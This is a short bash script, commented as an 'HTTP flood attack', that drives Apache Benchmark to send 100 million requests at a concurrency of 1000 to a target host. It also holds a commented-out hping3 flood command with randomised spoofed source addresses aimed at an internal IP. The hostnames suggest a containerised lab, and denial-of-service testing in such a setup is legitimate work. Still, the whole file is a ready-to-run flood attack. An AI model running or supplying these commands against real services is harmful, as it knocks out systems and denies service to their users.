#!/bin/bash

# Target URL
TARGET_URL="http://web/"

# Number of requests to perform
NUM_REQUESTS=100000000

# Number of multiple requests to perform at a time
CONCURRENCY=1000

# Perform HTTP flood attack using Apache Benchmark
ab -n $NUM_REQUESTS -c $CONCURRENCY -s 120 $TARGET_URL
# hping3 --rand-source --flood 172.18.0.3 -p 80
